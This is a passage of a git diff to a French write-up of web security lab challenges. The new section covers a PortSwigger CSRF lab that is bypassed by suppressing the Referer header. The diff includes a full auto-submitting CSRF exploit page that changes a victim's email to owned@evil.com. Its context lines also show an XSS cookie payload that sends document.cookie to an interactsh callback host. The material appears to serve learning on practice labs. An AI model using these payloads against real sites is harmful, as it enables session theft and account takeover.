@@ -440,7 +440,7 @@ PortSwigger recommande donc :
   POST /web-client/ch19/ HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Cookie: status=invite
- ```
+  ```
   
 Je remarque un élément intéressant :
 👉 Le cookie status semble indiquer si l’utilisateur est invite ou admin.
@@ -464,6 +464,7 @@ document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie
 Ensuite, j’injecte ce payload dans la valeur du cookie status dans Burp Repeater :
  ```
 Cookie: status=aaaa"><script>document.location.href="https://MON_ID_INTERACTSH.oast.fun/?c="+document.cookie</script>;
+ 
  ```
 Puis j’envoie la requête modifiée.
 ## Déclenchement de l’attaque
@@ -497,4 +498,71 @@ E5HKEGyCXQVsYaehaqeJs0AfV
 ```
 
 👉 C’est la solution du challenge.
+# Challenge 4:CSRF where Referer validation depends on header being present
+## Analyse du fonctionnement normal
+Après connexion avec :
+```
+username: wiener  
+password: peter
+```
+je teste  le changement d’email (image)
+Burp Suite intercepte la requête :
+(image)
+## Test du filtre CSRF via Burp Repeater
+test:supprimer complètement le header Referer
+Je supprime la ligne :Referer: ...
+Résultat : Requête acceptée
+➡️ Le serveur n’oblige PAS la présence du Referer.
+➡️ C’est la faille : un Referer absent permet de bypass le contrôle CSRF.
+3. Contournement : suppression automatique du Referer
+
+Le navigateur envoie automatiquement un header Referer lors des requêtes POST cross-origin.
+
+Pour le supprimer, on utilise :
+```
+<meta name="referrer" content="no-referrer">
+```
+
+Cette balise force le navigateur à NE PAS envoyer de Referer, ce qui permet de contourner la protection CSRF.
+4. Construction du payload CSRF
+
+Sur l’exploit server du lab, j’héberge la page suivante :
+```
+<html>
+<head>
+  <meta name="referrer" content="no-referrer">
+</head>
+<body>
+  <h1>CSRF exploit</h1>
+  <form action="https://0a91008f049689fe827f066f008d0000.web-security-academy.net/my-account/change-email" method="POST" id="csrfForm">
+    <input type="hidden" name="email" value="owned@evil.com">
+  </form>
+
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
+```
+🔍 Pourquoi ça marche ?
+
+Le formulaire envoie une requête POST automatiquement.
+
+Grâce à la balise <meta name="referrer" content="no-referrer">,
+le navigateur supprime totalement le header Referer.
+
+Le serveur accepte la requête sans Referer.
+
+L’email de la victime est changé en : owned@evil.com.
+## Validation du challenge
+
+Depuis l’exploit server :
+
+Je clique sur Store pour sauvegarder l’exploit.
+
+Puis sur Deliver to victim.
+
+Le serveur victime charge mon exploit → requête POST sans Referer → email modifié.
+
+🎉 Challenge résolu.
 
